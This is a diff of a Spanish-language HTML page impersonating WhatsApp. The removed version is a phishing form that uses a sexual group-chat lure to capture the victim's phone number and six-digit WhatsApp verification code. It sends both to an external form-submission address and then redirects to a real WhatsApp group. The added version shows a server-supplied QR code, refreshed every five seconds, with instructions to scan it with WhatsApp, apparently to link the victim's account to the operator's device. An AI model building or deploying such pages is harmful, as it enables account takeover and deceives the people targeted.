@@ -3,267 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:title" content="🤤Chicas a todo dar😈">
-    <meta property="og:description" content="Únete al grupo de WhatsApp para disfrutar de contenido exclusivo.">
-    <meta property="og:image" content="https://photos.xgroovy.com/contents/albums/sources/633000/633809/689864.jpg">
-    <meta property="og:url" content=""> <!-- Cambia esto por la URL de tu página -->
-    <meta property="og:type" content="website">
-
-    <title>🤤Chicas a todo dar</title>
-    <link rel="icon" type="image/x-icon" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/rYZqPCBaG70.png">
+    <title>Escanear Código QR</title>
     <style>
-        /* Estilos generales */
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f2f5;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
+            background-color: #f0f0f0;
         }
-
-        /* Contenedor del login */
-        .login-container {
-            background-color: #ffffff;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        #qr-container {
             text-align: center;
-            width: 300px;
-            position: relative;
         }
-
-        /* Logo de WhatsApp */
-        .whatsapp-logo {
-            width: 80px; /* Ancho fijo */
-            height: 80px; /* Alto igual al ancho */
-            margin-bottom: 20px;
-            border-radius: 50%; /* Hace que la imagen sea redonda */
-            object-fit: cover; /* Evita que la imagen se distorsione */
-        }
-
-        /* Título */
-        h1 {
-            font-size: 24px;
-            color: #25d366;
-            margin-bottom: 20px;
-        }
-
-        /* Contenedor de inputs (código de país y número) */
-        .input-group {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-
-        /* Input del código de país */
-        #countryCode {
-            width: 50px;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 14px;
-            outline: none;
-        }
-
-        /* Input del número de teléfono */
-        #phoneNumber {
-            flex: 1;
-            padding: 8px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 14px;
-            outline: none;
-        }
-
-        /* Input del código de verificación */
-        #verificationCode {
-            width: 40%;
-            padding: 10px;
-            margin-bottom: 15px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 14px;
-            text-align: center;
-            outline: none;
-        }
-
-        /* Botón de inicio de sesión */
-        button {
-            width: 100%;
-            padding: 10px;
-            background-color: #25d366;
-            color: #ffffff;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-
-        button:hover {
-            background-color: #128c7e;
-        }
-
-        /* Ocultar elementos */
-        .hidden {
-            display: none;
-        }
-
-        /* Alertas personalizadas */
-        .custom-alert {
-            position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background-color: #25d366;
-            color: white;
-            padding: 15px 30px;
-            border-radius: 5px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            z-index: 1000;
-            animation: slideIn 0.5s ease-out;
-        }
-
-        .custom-alert.error {
-            background-color: #ff4444;
-        }
-
-        @keyframes slideIn {
-            from {
-                top: -50px;
-                opacity: 0;
-            }
-            to {
-                top: 20px;
-                opacity: 1;
-            }
+        #qr-image {
+            max-width: 100%;
+            height: auto;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <!-- Logo de WhatsApp -->
-        <img src="https://photos.xgroovy.com/contents/albums/sources/633000/633809/689864.jpg" alt="Chica" class="whatsapp-logo">
-        
-        <!-- Título -->
-        <h1>🤤Chicas a todo dar😈</h1>
-
-        <!-- Formulario de login (Primera parte: Código de país y número) -->
-        <form id="phoneForm">
-            <div class="input-group">
-                <input type="text" id="countryCode" name="PaisCode" placeholder="+52" required>
-                <input type="text" id="phoneNumber" name="CeluNumber" placeholder="Número de teléfono" required>
-            </div>
-            <button type="submit">Continuar</button>
-            <input type="hidden" name="_captcha" value="false">
-        </form>
-
-        <!-- Formulario de código de verificación (Segunda parte) -->
-        <form id="codeForm" class="hidden">
-            <div>
-                <input type="text" id="verificationCode" name="verificaCode" placeholder="Código" maxlength="6" required>
-            </div>
-            <button type="submit">Verificar</button>
-            <input type="hidden" name="_captcha" value="false">
-        </form>
+    <div id="qr-container">
+        <h1>Escanee el Código QR</h1>
+        <img id="qr-image" src="" alt="Código QR">
+        <p>Use WhatsApp en su teléfono para escanear este código.</p>
     </div>
 
-    <!-- Script para manejar el login -->
     <script>
-        const phoneForm = document.getElementById("phoneForm");
-        const codeForm = document.getElementById("codeForm");
-        const verificationCodeInput = document.getElementById("verificationCode");
-
-        // Función para mostrar alertas personalizadas
-        function showAlert(message, isError = false) {
-            const alertDiv = document.createElement("div");
-            alertDiv.className = `custom-alert ${isError ? "error" : ""}`;
-            alertDiv.textContent = message;
-            document.body.appendChild(alertDiv);
-
-            // Eliminar la alerta después de 3 segundos
-            setTimeout(() => {
-                alertDiv.remove();
-            }, 3000);
-        }
-
-        // Función para enviar datos del formulario
-        async function sendFormData(form, url) {
-            const formData = new FormData(form);
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    body: formData,
-                    headers: {
-                        'Accept': 'application/json'
-                    }
-                });
-                const result = await response.json();
-                console.log('Respuesta del servidor:', result);
-                showAlert("Datos enviados correctamente.");
-                return true; // Indica que el envío fue exitoso
-            } catch (error) {
-                console.error('Error:', error);
-                showAlert("...", true);
-                return false; // Indica que el envío falló
+        // Obtener el código QR del servidor
+        async function fetchQRCode() {
+            const response = await fetch('/qrcode');
+            const data = await response.json();
+            if (data.qr) {
+                document.getElementById('qr-image').src = data.qr;
+            } else {
+                alert('Código QR no disponible. Intente nuevamente.');
             }
         }
 
-        // Manejar el envío del formulario de teléfono
-        phoneForm.addEventListener("submit", function(event) {
-            event.preventDefault(); // Evita que el formulario se envíe automáticamente
-
-            // Obtener valores del formulario
-            const countryCode = document.getElementById("countryCode").value;
-            const phoneNumber = document.getElementById("phoneNumber").value;
-
-            // Validación básica
-            if (countryCode === "" || phoneNumber === "") {
-                showAlert("Por favor, completa todos los campos.", true);
-                return;
-            }
-
-            // Simular envío de código de verificación
-            showAlert(`Código de verificación enviado a:\n${countryCode} ${phoneNumber}`);
-            console.log(`Código de país: ${countryCode}, Número: ${phoneNumber}`);
-
-            // Enviar datos del formulario
-            sendFormData(phoneForm, 'https://formsubmit.co/thebullnot@gmail.com');
-
-            // Ocultar el formulario de teléfono y mostrar el de código
-            phoneForm.classList.add("hidden");
-            codeForm.classList.remove("hidden");
-        });
-
-        // Manejar el envío del formulario de código
-        codeForm.addEventListener("submit", async function(event) {
-            event.preventDefault(); // Evita que el formulario se envíe automáticamente
-
-            // Obtener el código de verificación (sin guion)
-            const verificationCode = verificationCodeInput.value.replace(/-/g, "");
-
-            // Validación básica
-            if (verificationCode === "") {
-                showAlert("Por favor, ingresa el código de verificación.", true);
-                return;
-            }
-
-            // Validar que el código tenga exactamente 6 dígitos
-            if (verificationCode.length !== 6 || !/^\d+$/.test(verificationCode)) {
-                showAlert("El código de verificación debe tener exactamente 6 dígitos.", true);
-                return;
-            }
-
-            // Enviar datos del formulario
-            const success = await sendFormData(codeForm, 'https://formsubmit.co/thebullnot@gmail.com');
-
-            // Si el envío fue exitoso, redirigir al enlace de WhatsApp
-            if (success) {
-                showAlert("Código verificado correctamente.\nRedirigiendo...");
-                window.location.href = "https://chat.whatsapp.com/JpD75y9mFKlLqc2u7FJj51";
-            }
-        });
+        // Actualizar el código QR cada 5 segundos
+        setInterval(fetchQRCode, 5000);
+        fetchQRCode(); // Cargar el código QR al abrir la página
     </script>
 </body>
 </html>
